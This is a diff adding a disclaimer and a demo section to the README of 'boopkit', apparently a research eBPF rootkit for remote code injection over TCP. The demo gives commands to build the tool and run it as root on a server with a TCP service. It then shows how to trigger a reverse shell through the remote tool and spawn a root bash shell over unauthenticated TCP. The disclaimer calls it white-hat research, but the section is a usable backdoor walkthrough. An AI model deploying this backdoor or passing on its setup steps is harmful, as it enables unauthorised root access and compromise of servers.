@@ -2,6 +2,33 @@
 
 A research project to demonstrate remote code injection over TCP with a malicious eBPF probe.
 
+### Disclaimer
+
+I am a professional security researcher. These are white hat tools used for research purposes only.
+
+Seriously please use these responsibly.
+
+# Demo
+
+Install `boopkit` on a server that is already running any TCP service (EG: nginx, apache, tomcat, etc).
+
+```
+git clone git@github.com:kris-nova/boopkit.git
+cd boopkit
+make
+sudo ./boopkit > /var/log/boop.log &
+```
+
+Trigger a reverse shell over an existing TCP service. 
+
+```
+# edit ./remote/remote as needed
+./remote/remote
+python -c "import pty; pty.spawn('/bin/bash')"
+```
+
+Enjoy the root shell over unauthenticated TCP. 
+
 # Components
 
 | eBPF Probe | Malicious Userspace Program                           | Remote Trigger                                              |
